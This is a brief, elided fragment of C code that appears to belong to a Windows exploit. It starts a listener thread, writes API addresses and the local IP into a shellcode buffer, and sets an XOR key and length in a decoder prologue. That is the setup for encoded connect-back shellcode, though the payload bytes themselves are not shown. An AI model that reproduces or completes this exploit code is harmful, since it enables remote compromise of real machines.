...
int main(int argc, char ** argv) {
	...
	CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE) AcceptThread, NULL, NULL, & uThread);*(long * )(shellcode + GMHOFF) = GMH;*(long * )(shellcode + GPAOFF) = GPA;*(long * )(shellcode + IPOFF) = getlocalhostip();
	for(i = 0; i < 256; i++) {
		int iBool = 1, j;
	...
	prologue[XOROFF] = xorkey;*(short int * )(prologue + SOFF) = SHELLCODELEN;
